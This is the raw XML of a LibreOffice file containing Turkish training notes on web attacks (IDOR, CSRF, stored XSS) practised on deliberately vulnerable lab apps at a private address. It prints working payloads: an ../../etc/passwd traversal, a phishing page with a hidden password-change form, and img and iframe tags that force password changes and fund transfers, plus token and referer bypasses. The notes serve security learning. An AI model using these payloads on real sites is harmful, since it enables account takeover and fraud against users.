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3ef70f" officeooo:paragraph-rsid="00407778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3ef70f" officeooo:paragraph-rsid="0045e3ce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45e3ce" officeooo:paragraph-rsid="0045e3c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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045e3ce" officeooo:paragraph-rsid="0045e3ce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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00476f7c" officeooo:paragraph-rsid="00476f7c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal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476f7c" officeooo:paragraph-rsid="00484733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3ef70f" officeooo:paragraph-rsid="00407778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484733" officeooo:paragraph-rsid="00484733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492b71" officeooo:paragraph-rsid="00492b71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499293" officeooo:paragraph-rsid="00499293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4b6c1f" officeooo:paragraph-rsid="004b6c1f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4ceff1" officeooo:paragraph-rsid="004ceff1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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045e3ce" officeooo:paragraph-rsid="00479b43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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045e3ce" officeooo:paragraph-rsid="00484733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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045e3ce" officeooo:paragraph-rsid="00492b71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officeooo:paragraph-rsid="00492b71"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0045e3ce"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00479b43"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00484733"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00492b71"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00492b71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C</text:p>
      <text:p text:style-name="P3">Authentication 401 (Broken AUthentication)</text:p>
      <text:p text:style-name="P3">Who Are You</text:p>
      <text:p text:style-name="P3">Authorization 403 (BAC)</text:p>
      <text:p text:style-name="P3">What Can You Do?</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">IDOR (Insecure Direct Object Reference)</text:p>
      <text:p text:style-name="P3">mutilidae &gt; OWAS 2013 &gt; A4 &gt; Test File Viewer</text:p>
      <text:p text:style-name="P2">textfile=../../etc/passwd <text:span text:style-name="T1">(manizpüle ettik.)</text:span></text:p>
      <text:p text:style-name="P3">inspect ve source code dan da manipüle edebiliriz.</text:p>
      <text:p text:style-name="P3">A4 &gt; teki tüm diğer yerlerde yapabiliriz.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">BWAPP &gt; A4 Insecure DOR (Order Tickets)</text:p>
      <text:p text:style-name="P3">intercept edip, bilet fiyatını değiştirebildik.</text:p>
      <text:p text:style-name="P3">Medium deneyelim</text:p>
      <text:p text:style-name="P3">gizli olarak verilmiş ve kendimiz değer olarak ekleyip bulabildik.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">CSRF (Cross-Site Request Forgery)</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P4">Phishing ile Sömürme</text:p>
      <text:p text:style-name="P5">DVWA (admin/admin) &gt; CSRF</text:p>
      <text:p text:style-name="P5">şifre değişimi, URL de gözleniyor.</text:p>
      <text:p text:style-name="P5">Şifreyi uzaktan, manipüle ettik.</text:p>
      <text:p text:style-name="P5">URL,i önceden manipüle edip gönderirsek otomatik olarak yapmış oluruz.</text:p>
      <text:p text:style-name="P5">Buna URL shortener ve encoding ile gizleyebiliriz.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P1">&lt;h1&gt;Aşağıdaki soruyu çöz.&lt;/h1&gt;</text:p>
      <text:p text:style-name="P1">&lt;br&gt;</text:p>
      <text:p text:style-name="P1">6/(2+2)=?</text:p>
      <text:p text:style-name="P1">&lt;br&gt;&lt;br&gt;</text:p>
      <text:p text:style-name="P1">&lt;a href="http://10.10.10.22/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"&gt;&lt;button&gt;Göster&lt;/button&gt;&lt;/a&gt;</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">&lt;form action="http://10.10.10.22/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#" method="GET"&gt;</text:p>
      <text:p text:style-name="P1">&lt;br&gt;</text:p>
      <text:p text:style-name="P1">&lt;input type="hidden" name="password_new" value="123456"&gt;</text:p>
      <text:p text:style-name="P1">&lt;input type="hidden" name="password_conf" value="123456"&gt;</text:p>
      <text:p text:style-name="P1">&lt;input type="submit" value="Göster" name="Change"&gt;</text:p>
      <text:p text:style-name="P1">&lt;/form&gt;</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P13"><text:span text:style-name="T2">XSS </text:span>ile Sömürme</text:p>
      <text:p text:style-name="P6">DVWA (admin/<text:span text:style-name="T3">123</text:span>) &gt; CSRF</text:p>
      <text:p text:style-name="P8">mediuma aldık. Değiştirmeye çalıştığımızda, hata bile vermiyor.</text:p>
      <text:p text:style-name="P8">Source code a bakacağız.</text:p>
      <text:p text:style-name="P8">Http referer olarak 127.0.0.1 olması gerekiyor, bunu sağlayacağız.</text:p>
      <text:p text:style-name="P8">Bu da, yönlendirme yapılmasına izin vermez, çünkü http referer yönlendirici sitenin ip sini kullanır.</text:p>
      <text:p text:style-name="P8">Çift tırnakla verildiği için, ip olarak değil de string olarak geçmesi bile yeterldir.</text:p>
      <text:p text:style-name="P8">Referer da 127.0.0.1 olarak değiştik ve şifremizi 12 olarak belirledik.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8"><text:soft-page-break/>XSS Stored a girelim. (low)</text:p>
      <text:p text:style-name="P8">XSS manipüasyonu yapacağız. Öncelikle inspect ten karakter sınırını 250 ye çıkardık ve şimdi de lowda aldığımız şifre değiştirme url sini kopyalıyoruz.</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">&lt;img src="<text:a xlink:type="simple" xlink:href="http://10.10.10.22/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.10.22/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change</text:a>#"&gt;</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P8">mediumda deneyelim</text:p>
      <text:p text:style-name="P8">xss e yeniden maruz kaldığımızda da şifremiz değişiyor.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Stored </text:span><text:span text:style-name="T2">XSS </text:span><text:span text:style-name="T3">ve iFrame ile Injection ile Prompt ByPass</text:span></text:p>
      <text:p text:style-name="P9">webgoat(guest/guest)</text:p>
      <text:p text:style-name="P9">XSS &gt; CSRF</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P16"><text:span text:style-name="T5">&lt;img src=”http://10.10.10.22/WebGoat/attack?Screen=52&amp;menu=900&amp;</text:span>transferFunds=4000”&gt;</text:p>
      <text:p text:style-name="P9">url nin de sonuna transferFunds=4000 ekliyoruz ve gidiyoruz.</text:p>
      <text:p text:style-name="P9">Confirm I, kullanıcı seçmeden seçtireceğiz.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&lt;iframe</text:p>
      <text:p text:style-name="P9">src="http://10.10.10.22/WebGoat/attack?Screen=52&amp;menu=900%transferFunds=4000"</text:p>
      <text:p text:style-name="P9">width="800" height="300" scrolling="yes"&gt;</text:p>
      <text:p text:style-name="P9">&lt;/iframe&gt;</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&lt;iframe</text:p>
      <text:p text:style-name="P9">src="http://10.10.10.22/WebGoat/attack?Screen=52&amp;menu=900%transferFunds=CONFIRM"</text:p>
      <text:p text:style-name="P9">width="800" height="300" scrolling="yes"&gt;</text:p>
      <text:p text:style-name="P9">&lt;/iframe&gt;</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P15"><text:span text:style-name="T3">Stored </text:span><text:span text:style-name="T2">XSS </text:span><text:span text:style-name="T4">ile Token ByPass</text:span></text:p>
      <text:p text:style-name="P10">CSRF Prompt ByPass</text:p>
      <text:p text:style-name="P11">URL nin devamına, &amp;transferFunds=6000&amp;CSRFToken= yazıyoruz.</text:p>
      <text:p text:style-name="P12">ByPass+Token kullanacağız..</text:p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8T16:53:23.740778234</dc:date>
    <meta:editing-duration>PT14H37M9S</meta:editing-duration>
    <meta:editing-cycles>48</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.2$Linux_X86_64 LibreOffice_project/3c58a8f3a960df8bc8fd77b461821e42c061c5f0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="63" meta:word-count="288" meta:character-count="2705" meta:non-whitespace-character-count="2480"/>
  </office:meta>
</office:document-meta>
</file>